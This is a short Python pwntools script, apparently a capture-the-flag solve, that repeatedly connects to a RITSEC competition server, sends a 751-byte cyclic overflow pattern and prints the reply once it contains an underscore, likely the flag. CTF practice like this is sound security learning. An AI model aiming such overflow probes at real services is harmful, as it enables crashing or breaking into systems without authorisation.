from pwn import *
from time import sleep
for i in range(20,5000):
	io = remote("fun.ritsec.club",1338)
	io.sendline(cyclic(751))
	d = io.recv(timeout=2)
	if '_' in d:
		log.info(d)
		break
	else:
		io.close()


